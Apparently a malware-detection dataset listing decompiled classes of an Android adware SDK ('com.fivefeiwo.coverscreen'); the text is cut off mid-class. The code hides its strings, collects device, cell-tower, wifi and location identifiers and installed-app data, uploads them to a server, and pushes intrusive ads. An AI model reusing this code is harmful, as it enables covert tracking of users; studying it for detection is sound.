HrmBSzCAq/2Clovrq+TaaG4pwEpaZsgW6i4v4uqSxOAZna6XO1R54B4Qg8e2oeslKcwpqqL7jpnh4RkD17pJfy/4uoeucg1IaT0u+S1YotAWKqBiKNsj303UhATYHdjW8NIuDW6jIcAMdN0TYvTai6FOBKxMaidpaE79XOzIxNyQLTZq2SSuO6u/jcihKwsRgtv2OGidP3p7713Muo4XI8yUAUIM3B53keXTSHYqZ5ekSvXqNmNI4r6k/MxtJnX8He1aUovEnWumY6o7H3gWic7RjAy/W9uNjrxdG2AXEcI89uxuIpEbgvIxLx1uBjF9t+uwff3LSZwE7pdPoMsYWAcWo3k2KW8pNX5QGfTvLFDABfIMUCH+wlYLhlsMb0b22WsubPOLglClRi6f66Vj1aF0cQomQVkuKYqrpuKTRRxJJb9gqDji2X+5GSlZ4O7Hr7OKW+dag+dkYriZulv+ZxDdpeEYOG6xWKCSW7z8t1cY2G1z9A8wz0aoAM4eyrwZd6R8tAma8obaebYxKTrLG4Bg3Y+KfzovRfQW7Cdb5OAFg8g29t/jqMFw2XW2VMhMBUXw1BHwbhzpt6c3DHU89jx8r78PBfFfm/5TT4ewGp8EStf3AI3/zxz7H9pQohYyWL3FrqTbTW6HHXwP+mnCq2y0Np4kwICfxqIwGmTQIEir6ByJYuil7aoSH2674jBQJAkdqOsFHfQGN3EUf0zdE8399BwWf7ZWn5bJEMFP5OVHE9UtldbfLqbpdjMIsk50jQseKMGmB8cQZnGQxuXjffw+tmJvBt5F23SqDtFYlnoHVExck1xyZqJQCjXohjuVyijK3xtIx3OGaJ0UrygTERy4mMSKV0m2WncHaSTcpKniqBHkqhkIF2mdL/D4/grilW/GzNchROnxaSKre/9ibKtj6HCxyEO1Ionaa5c+fJANg0Ttzj8dzAr4IwPVm1FNKn+FFHAYIeaMQT7DsVX6bhCSjQWeUCfe7DdzaFFSEYI0Kn+ggtGOWLrZ3H4c0uf0pu1RXs3w7QqnOsLAEkc9Bu6qSaQavtKIr/1J0uP1XKQmwaJsggW6ShGrMExhFsXAQWcS6GDYOZihMAUesJUR/cPyVXyOaA6zhuXvUU5qc58OCdC7Bk0W2wx8Rg5tRMDA17UPtRA9o6OvHq/mq89uYBNLddlQw5ZRoxSgGQoaXTwv2MTGAzzCyKEmIg5pVWypbJr76NN0VByGP4QeTVwcdCtUTqDMWuQSjWrMcGPuXwgzDDMcMwS3BfqzyQJFPEcViS+7AV8j2+A1s32kS9JULOxQehxK65osuHx2e24Mu3No5rRp9BHtFYl9mH+4miX4oElsU2OVl6BuV8lz+iNL4Oavsl7Tyw9qxej76DzcbEa6J5FCcFx1zES8zUqrnGa84zyQquotG8SS/W+IESKljGCeIC2Umcb7UFu4DANWqbmBIYFslcDChzRIC1Y+ypMIt2ZDHK8/F+m0HRXKy4RgeBih4vaZVi8Z6VL0CsBJ85ZkWyS+NnUDRGmuSmoJyD5OGYImXCFVpKNLiOxMakCsMeEOOL0gX34fIFu1F28Ty/2Tqx7EYzy6fuF+P99YiAw0M+sE2G4f5saxvRmVPsMo/zqyg+FzYSEDdN1HdS84/IA10DPRIkvqxPgDyAWQQwzSHPpVC/T/HvOisBu8ABG4n/J4Bv0AttgRXa6z3DNftOQi7MNNHW0DaDQ53LqIT/FYVwm4S3C7LKcAu364MljJZwCxUs4X+fJdzCzBJunzRYOsU5gzBewu3arYfBUgmj8SEMe8PiCLfxm1mk9m8yWJ5ULKYiIpZ4eLxhlxRuehO/WmwE4YPPmDzJYDlF1xz64FlYTHyWMSUspXDTGp8z4f/2bi3/t3f/I8AADPtphitXuCAAAAAASUVORK5CYII="".getBytes(com.seleuco.common.util.e.f)),0),null);       }     }  catch (    Exception e) {     }     return drawable;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\AnimationAnimationListenerC0025x.code","final class AnimationAnimationListenerC0025x implements Animation.AnimationListener {   private Animation.AnimationListener a;   private View b;   public AnimationAnimationListenerC0025x(  C0020s c0020s,  Animation.AnimationListener animationListener,  View view){     this.a=animationListener;     this.b=view;   }   @Override public final void onAnimationEnd(  Animation animation){     this.a.onAnimationEnd(animation);     this.b.setVisibility(0);   }   @Override public final void onAnimationRepeat(  Animation animation){     this.a.onAnimationRepeat(animation);   }   @Override public final void onAnimationStart(  Animation animation){     this.a.onAnimationStart(animation);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ao.code","public final class ao {   int a=0;   int b=0; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ap.code","public final class ap {   public static int a(  Context context,  String str,  String str2,  int i){     return context.getSharedPreferences(str,0).getInt(str2,i);   }   public static String a(  Context context,  String str,  String str2){     return a(context,str,str2,""0"");   }   public static String a(  Context context,  String str,  String str2,  String str3){     return context.getSharedPreferences(str,0).getString(str2,str3);   }   public static void a(  Context context,  String str,  String str2,  boolean z){     context.getSharedPreferences(str,0).edit().putBoolean(str2,z).commit();   }   public static void b(  Context context,  String str,  String str2){     context.getSharedPreferences(str,0).edit().remove(str2).commit();   }   public static void b(  Context context,  String str,  String str2,  int i){     context.getSharedPreferences(str,0).edit().putInt(str2,i).commit();   }   public static void b(  Context context,  String str,  String str2,  String str3){     context.getSharedPreferences(str,0).edit().putString(str2,str3).commit();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\aq.code","public final class aq {   public static boolean a(  String str){     return str == null || str.trim().length() == 0 || str.equals(""null"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\B.code","public final class B implements Animation.AnimationListener {   final A a;   private LinearLayout b;   public B(  A a,  LinearLayout linearLayout){     this.a=a;     this.b=linearLayout;   }   @Override public final void onAnimationEnd(  Animation animation){     this.b.setOnTouchListener(new C(this));     this.a.setOnClickListener(new D(this));   }   @Override public final void onAnimationRepeat(  Animation animation){   }   @Override public final void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C.code","final class C implements View.OnTouchListener {   private B a;   public C(  B b){     this.a=b;   }   @Override public final boolean onTouch(  View view,  MotionEvent motionEvent){     this.a.a.f98c.onTouchEvent(motionEvent);     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0003b.code","public final class C0003b extends Thread {   private AbstractC0002a a;   public C0003b(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void run(){     Context e=this.a.e();     String replace=""coverscreen_feiwocp"".replace(""_feiwocp"","""");     try {       if (!e.getSharedPreferences(replace,0).getBoolean(""isFirstRun_feiwocp"".replace(""_feiwocp"",""""),true)) {         AbstractC0002a.b(this.a);       }  else {         try {           Thread.sleep(60000L);         }  catch (        InterruptedException e2) {         }         AbstractC0002a.a(this.a);       }     }  catch (    Exception e3) {     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0004c.code","public final class C0004c extends TimerTask {   private AbstractC0002a a;   public C0004c(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void run(){     this.a.b();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0005d.code","public final class C0005d implements aa {   private AbstractC0002a a;   public C0005d(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆuploadClientInfoï¼‰ï¼š"").append(str);     context=this.a.d;     ap.a(context,""coverscreen_feiwocp"".replace(""_feiwocp"",""""),""isFirstRun_feiwocp"".replace(""_feiwocp"",""""),false);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0006e.code","public final class C0006e implements aa {   private AbstractC0002a a;   public C0006e(  AbstractC0002a abstractC0002a){     this.a=abstractC0002a;   }   @Override public final void a(  boolean z,  String str){     Context context;     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstallï¼‰ï¼š"").append(str);     if (z) {       context=this.a.d;       ap.b(context,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0010i.code","final class C0010i implements aa {   private CPManager a;   public C0010i(  CPManager cPManager){     this.a=cPManager;   }   @Override public final void a(  boolean z,  String str){     List b;     List list;     List list2;     List list3;     this.a.e();     new StringBuilder().append(""èŽ·å�–å¹¿å‘Šçš„ç½‘ç»œè¯·æ±‚å¾—åˆ°è¿”å›žç»“æžœï¼š"").append(str);     if (z) {       try {         JSONObject jSONObject=new JSONObject(str);         int optInt=jSONObject.optInt(""errorcode_feiwocp"".replace(""_feiwocp"",""""),1);         String optString=jSONObject.optString(""errormessage_feiwocp"".replace(""_feiwocp"",""""));         if (optInt != 0) {           this.a.e();           new StringBuilder().append(""request failed: "").append(optString);         }  else {           int optInt2=jSONObject.optInt(""screenOnNum_feiwocp"".replace(""_feiwocp"",""""),-1);           int optInt3=jSONObject.optInt(""screenOnShowRate_feiwocp"".replace(""_feiwocp"",""""),-1);           jSONObject.optInt(""coverScreenRefreshTime_feiwocp"".replace(""_feiwocp"",""""),60);           int optInt4=optInt2 == -1 ? jSONObject.optInt(""screenNoNum_feiwocp"".replace(""_feiwocp"",""""),3) : optInt2;           int optInt5=optInt3 == -1 ? jSONObject.optInt(""screenNoShowRate_feiwocp"".replace(""_feiwocp"",""""),10) : optInt3;           int optInt6=jSONObject.optInt(""screenOnSwitchDelay_feiwocp"".replace(""_feiwocp"",""""),10);           boolean optBoolean=jSONObject.optBoolean(""screenOnShow_feiwocp"".replace(""_feiwocp"",""""),true);           boolean optBoolean2=jSONObject.optBoolean(""coverDownloadConfirm_feiwocp"".replace(""_feiwocp"",""""),false);           JSONArray optJSONArray=jSONObject.optJSONArray(""ads_placeholder"".replace(""_placeholder"",""""));           int i=optInt6 > 0 ? optInt6 : 10;           if (optJSONArray != null) {             this.a.a(optJSONArray);           }           CPManager.a(this.a,0);           CPManager cPManager=this.a;           CPManager cPManager2=this.a;           b=CPManager.b(optJSONArray);           cPManager.f99c=b;           this.a.d=new Date(new Date().getTime() + 60000);           ap.b(this.a.e(),S.j,S.p,optInt4);           ap.b(this.a.e(),S.j,S.n,optInt5);           ap.b(this.a.e(),S.j,S.o,i * 1000);           ap.a(this.a.e(),S.j,S.l,optBoolean);           ap.a(this.a.e(),S.j,S.i,optBoolean2);           new StringBuilder().append(""setContent, screenOnNum: "").append(optInt4).append("", screenOnShowRate: "").append(optInt5).append("", screenOnSwitchDelay: "").append(i * 1000).append("", enableScreenOnShow: "").append(optBoolean).append("", downloadConfirm: "").append(optBoolean2).append("", coverScreenRefreshTime: "").append(1);         }       }  catch (      JSONException e) {         this.a.e();         new StringBuilder().append(""error result: "").append(e);       }     }     list=this.a.f99c;     if (list != null) {       list2=this.a.f99c;       if (!list2.isEmpty()) {         String replace=""C_feiwocp"".replace(""_feiwocp"","""");         StringBuilder append=new StringBuilder().append(""size: _feiwocp"".replace(""_feiwocp"",""""));         list3=this.a.f99c;         Log.i(replace,append.append(list3.size()).toString());         this.a.c();         this.a.e();         this.a.a(false);       }     }     Log.i(""C_feiwocp"".replace(""_feiwocp"",""""),""size: 0_feiwocp"".replace(""_feiwocp"",""""));     this.a.c();     this.a.e();     this.a.a(false);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0011j.code","final class C0011j extends BroadcastReceiver {   private SA a;   public C0011j(  SA sa){     this.a=sa;   }   @Override public final void onReceive(  Context context,  Intent intent){     this.a.finish();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0014m.code","public final class C0014m extends T {   final SA a;   private Q b;   public C0014m(  SA sa,  Q q){     this.a=sa;     this.b=q;   }   @Override public final void a(  H h,  String str,  boolean z){     super.a(h,str,z);     if (""true_feiwocp"".replace(""_feiwocp"","""").equals(this.b.o()) && z) {       this.a.a.post(new RunnableC0015n(this,str,h));     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0016o.code","public final class C0016o implements aa {   public C0016o(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendClickRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0017p.code","public final class C0017p implements aa {   public C0017p(  SA sa){   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendShowRequestï¼‰ï¼š"").append(str);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0018q.code","final class C0018q extends Thread {   private Intent a;   private Context b;   private SR f118c;   public C0018q(  SR sr,  Intent intent,  Context context){     this.f118c=sr;     this.a=intent;     this.b=context;   }   @Override public final void run(){     String substring=this.a.getDataString().substring(8);     try {       SR.a(this.f118c,this.b,substring);       if (CPManager.getInstance() != null) {         CPManager.getInstance().a(substring);       }     }  catch (    Exception e) {       new StringBuilder().append(""ä¸Šä¼ åŒ…å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(e);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0019r.code","public final class C0019r implements aa {   private Context a;   private String b;   public C0019r(  SR sr,  Context context,  String str){     this.a=context;     this.b=str;   }   @Override public final void a(  boolean z,  String str){     new StringBuilder().append(""æœ�åŠ¡å™¨è¿”å›žï¼ˆsendAppInstall from ScreenReceiverï¼‰ï¼š"").append(str);     if (z) {       return;     }     new StringBuilder().append(""ä¸Šä¼ å®‰è£…ä¿¡æ�¯å¤±è´¥ï¼š"").append(str);     String a=ap.a(this.a,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     if (a != null) {       new StringBuilder().append(a).append("","").append(this.b);     }  else {       String str2=this.b;     }     ap.b(this.a,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),this.b);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0020s.code","public class C0020s extends LinearLayout {   SA a;   List b;   private Timer f119c;   private TimerTask d;   private int e;   public C0020s(  SA sa,  List list){     super(sa);     new Handler();     setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setGravity(17);     this.a=sa;     this.b=list;     this.e=ap.a(sa,S.j,S.o,5);   }   private void c(  View view,  Q q){     AlertDialog.Builder builder=new AlertDialog.Builder(getContext());     builder.setCancelable(false);     builder.setTitle(""æ��ç¤º_feiwocp"".replace(""_feiwocp"",""""));     builder.setMessage(""ç¡®å®šä¸‹è½½ _feiwocp"".replace(""_feiwocp"","""") + q.d() + "" ï¼Ÿ"");     builder.setPositiveButton(""ç¡®å®š_feiwocp"".replace(""_feiwocp"",""""),new DialogInterfaceOnClickListenerC0022u(this,view,q));     builder.setNegativeButton(""å�–æ¶ˆ_feiwocp"".replace(""_feiwocp"",""""),new DialogInterfaceOnClickListenerC0023v(this));     builder.show();     i();   }   public int a(  View view,  Q q){     int indexOf=this.b.indexOf(q);     this.b.remove(q);     if (indexOf < 0) {       return 0;     }     if (indexOf >= this.b.size()) {       a(indexOf - 1);       return indexOf - 1;     }     a(indexOf);     return indexOf;   }   public final List a(){     return this.b;   }   public final void a(  int i){     if (this.b.isEmpty()) {       return;     }     this.a.b((Q)this.b.get(i));   }   public final void a(  ImageView imageView,  String str,  boolean z){     imageView.setTag(str);     aj.a().a(getContext(),str,new C0024w(this,imageView,str,z));   }   public final void b(){     c();     d();     h();   }   public final void b(  View view,  Q q){     int b=P.b(getContext());     if (Q.a.equals(q.h())) {       if (b == 4) {         if (""false_feiwocp"".replace(""_feiwocp"","""").equals(q.n())) {           c(view,q);           return;         }       }  else       if (""false_feiwocp"".replace(""_feiwocp"","""").equals(q.p())) {         c(view,q);         return;       }     }     a(view,q);     this.a.a(q);   }   protected void c(){   }   protected void d(){   }   public final void e(){     this.a.finish();   }   public void f(){   }   public final void g(){     i();     h();   }   public final void h(){     i();     if (this.b == null || this.b.isEmpty()) {       return;     }     if (this.f119c == null) {       this.f119c=new Timer();     }     this.d=new C0026y(this);     this.f119c.schedule(this.d,this.e,this.e);   }   public final void i(){     if (this.d != null) {       this.d.cancel();       this.d=null;     }     if (this.f119c != null) {       this.f119c.cancel();       this.f119c=null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0024w.code","final class C0024w implements am {   private ImageView a;   private String b;   private boolean f121c;   private C0020s d;   public C0024w(  C0020s c0020s,  ImageView imageView,  String str,  boolean z){     this.d=c0020s;     this.a=imageView;     this.b=str;     this.f121c=z;   }   @Override public final void a(  Drawable drawable){     Bitmap createBitmap;     if (drawable == null || this.a.getTag() == null || !this.a.getTag().equals(this.b)) {       return;     }     if (!this.f121c) {       this.a.setImageDrawable(drawable);       return;     }     ImageView imageView=this.a;     Bitmap copy=((BitmapDrawable)drawable).getBitmap().copy(Bitmap.Config.ARGB_8888,false);     float a=an.a(this.d.getContext(),8.0f);     if (copy == null) {       createBitmap=null;     }  else {       createBitmap=Bitmap.createBitmap(copy.getWidth(),copy.getHeight(),Bitmap.Config.ARGB_8888);       Canvas canvas=new Canvas(createBitmap);       Paint paint=new Paint();       Rect rect=new Rect(0,0,copy.getWidth(),copy.getHeight());       RectF rectF=new RectF(rect);       paint.setAntiAlias(true);       canvas.drawARGB(0,0,0,0);       paint.setColor(-12434878);       canvas.drawRoundRect(rectF,a,a,paint);       paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));       canvas.drawBitmap(copy,rect,rect,paint);       copy.recycle();     }     imageView.setImageBitmap(createBitmap);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\C0026y.code","public final class C0026y extends TimerTask {   final C0020s a;   public C0026y(  C0020s c0020s){     this.a=c0020s;   }   @Override public final void run(){     this.a.a.runOnUiThread(new RunnableC0027z(this));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\CPManager.code","public final class CPManager extends AbstractC0002a {   private static CPManager h;   private List f99c;   private Date d;   private int e;   private boolean f;   private long g;   private CPManager(  Context context,  String str){     super(context,str);     this.d=null;     this.e=0;     this.f=false;   }   private int a(  Context context){     if (context == null || !P.a(context)) {       this.g=new Date().getTime();       this.f=true;       return 2;     }     if (this.f99c == null || this.f99c.isEmpty()) {       this.g=new Date().getTime();       this.f=true;       a(true);       return 2;     }     if (this.e >= this.f99c.size()) {       this.e=0;     }     if (!a(this.f99c,this.e)) {       return 4;     }     a(true);     return 0;   }   public static int a(  CPManager cPManager,  int i){     cPManager.e=0;     return 0;   }   public static List b(  JSONArray jSONArray){     if (jSONArray == null) {       return null;     }     ArrayList arrayList=new ArrayList();     for (int i=0; i < jSONArray.length(); i++) {       try {         Q a=Q.a(jSONArray.getJSONObject(i));         if (a != null && a.a() > 0) {           arrayList.add(a);         }       }  catch (      Exception e) {         return null;       }     }     return arrayList;   }   public static void close(  Context context){     context.sendBroadcast(new Intent(S.q));   }   public static void destory(  Context context){     if (h == null || context == null) {       return;     }     close(context);     h.a();   }   public static CPManager getInstance(){     return h;   }   public static CPManager init(  Context context,  String str){     if (h != null) {       return h;     }     if (context == null) {       throw new IllegalArgumentException(""context is null_feiwocp"".replace(""_feiwocp"",""""));     }     if (str == null || str.trim().length() < 8) {       throw new IllegalArgumentException(""appkey is error_feiwocp"".replace(""_feiwocp"",""""));     }     CPManager cPManager=new CPManager(context,str);     h=cPManager;     return cPManager;   }   public static void setShowAtScreenOn(  boolean z){     if (h != null) {       a=z;       ap.a(h.e(),S.j,S.m,z);     }   }   public static int showAd(  Context context){     if (h == null) {       return 1;     }     try {       return h.a(context);     }  catch (    Exception e) {       return 5;     }   }   @Override public final void a(){     super.a();     h=null;   }   public final void a(  int i){     this.e=i;   }   public final void a(  String str){     if (aq.a(str) || this.f99c == null) {       return;     }     Iterator it=this.f99c.iterator();     while (it.hasNext()) {       if (str.equals(((Q)it.next()).e())) {         it.remove();       }     }   }   @Override public final void b(){     if (this.b) {       e();       return;     }     if (this.d != null && this.d.getTime() > new Date().getTime() && this.f99c != null && this.f99c.size() > 0) {       e();       return;     }     this.b=true;     JSONObject a=H.a(e(),S.a);     ab abVar=new ab();     abVar.a(e(),I.e(),d(),a.toString());     abVar.a(new C0010i(this));     e();     Z.a().a(abVar);   }   @Override public final void c(){     super.c();     if (this.f99c == null || this.f99c.isEmpty() || !this.f) {       return;     }     this.f=false;     if (new Date().getTime() - this.g <= 10000) {       a(e());     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\D.code","final class D implements View.OnClickListener {   private B a;   public D(  B b){     this.a=b;   }   @Override public final void onClick(  View view){     if (this.a.a.e >= this.a.a.a().size()) {       this.a.a.f();       return;     }     Q q=(Q)this.a.a.a().get(this.a.a.e);     if (""true"".equals(q.q())) {       this.a.a.b(this.a.a.d.getChildAt(this.a.a.e),q);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\DialogInterfaceOnClickListenerC0022u.code","final class DialogInterfaceOnClickListenerC0022u implements DialogInterface.OnClickListener {   private View a;   private Q b;   private C0020s f120c;   public DialogInterfaceOnClickListenerC0022u(  C0020s c0020s,  View view,  Q q){     this.f120c=c0020s;     this.a=view;     this.b=q;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.f120c.a(this.a,this.b);     this.f120c.a.a(this.b);     this.f120c.h();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\DialogInterfaceOnClickListenerC0023v.code","final class DialogInterfaceOnClickListenerC0023v implements DialogInterface.OnClickListener {   private C0020s a;   public DialogInterfaceOnClickListenerC0023v(  C0020s c0020s){     this.a=c0020s;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.a.h();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\E.code","final class E implements DownloadListener {   private WA a;   public E(  WA wa){     this.a=wa;   }   @Override public final void onDownloadStart(  String str,  String str2,  String str3,  String str4,  long j){     this.a.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\F.code","public final class F extends WebChromeClient {   private WA a;   public F(  WA wa){     this.a=wa;   }   @Override public final void onProgressChanged(  WebView webView,  int i){     this.a.setProgress(i * 100);     WA.a(this.a,""å·²åŠ è½½ >> _feiwocp"".replace(""_feiwocp"","""") + i + ""%"");     if (i >= 100) {       WA.a(this.a,null);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\G.code","public final class G extends WebViewClient {   private WA a;   public G(  WA wa){     this.a=wa;   }   @Override public final void onPageFinished(  WebView webView,  String str){     this.a.a.getSettings().setBlockNetworkImage(false);     super.onPageFinished(webView,str);   }   @Override public final void onReceivedError(  WebView webView,  int i,  String str,  String str2){     if (this.a.b.equalsIgnoreCase(str2) || (this.a.b + ""/"").equalsIgnoreCase(str2)) {       this.a.a.loadData(""<h1>Page load Error !</h1>_feiwocp"".replace(""_feiwocp"",""""),""text/html_feiwocp"".replace(""_feiwocp"",""""),""UTF-8_feiwocp"".replace(""_feiwocp"",""""));       this.a.f110c=true;     }     WA.a(this.a,""åŠ è½½å¤±è´¥_feiwocp"".replace(""_feiwocp"",""""));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\H.code","public class H {   private int a;   private String b;   private String f100c;   private String d;   private String e;   public H(){   }   public H(  int i,  String str,  String str2,  String str3,  String str4){     this.a=i;     this.b=str;     this.f100c=str2;     this.d=str3;     this.e=str4;   }   public static JSONObject a(  Context context,  double d,  double d2,  String str,  int i,  String str2,  String str3){     String a=ai.a(context);     String c2=J.a(context).c();     String d3=J.a(context).d();     String b=J.a(context).b();     String a2=J.a(context).a();     String c3=ai.c(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""adid_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""appkey_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""type_feiwocp"".replace(""_feiwocp"",""""),0);       jSONObject.put(""lat_feiwocp"".replace(""_feiwocp"",""""),0.0d);       jSONObject.put(""lon_feiwocp"".replace(""_feiwocp"",""""),0.0d);       jSONObject.put(""cellid_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""lac_feiwocp"".replace(""_feiwocp"",""""),d3);       jSONObject.put(""mcc_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c3);       jSONObject.put(""url_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),S.a);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.f107c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  int i){     String a=ai.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""adid_feiwocp"".replace(""_feiwocp"",""""),i);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),S.a);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.f107c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str){     String a=ai.a(context);     String b=J.a(context).b();     String a2=ai.a();     ao d=ai.d(context);     ah.a();     boolean a3=ah.a(context,""com.tencent.mm_feiwocp"".replace(""_feiwocp"",""""));     int b2=P.b(context);     String str2=ac.c().a() + "":"" + ac.c().b();     String c2=J.a(context).c();     String d2=J.a(context).d();     String str3=(aq.a(c2) || aq.a(d2)) ? """" : c2 + "":"" + d2;     String c3=ai.c(context);     String b3=ai.b();     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""brand_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""model_feiwocp"".replace(""_feiwocp"",""""),b3);       jSONObject.put(""latlon_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""cidlac_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c3);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""width_feiwocp"".replace(""_feiwocp"",""""),d.a);       jSONObject.put(""weixinflag_feiwocp"".replace(""_feiwocp"",""""),a3);       jSONObject.put(""networktype_feiwocp"".replace(""_feiwocp"",""""),b2);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.f107c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  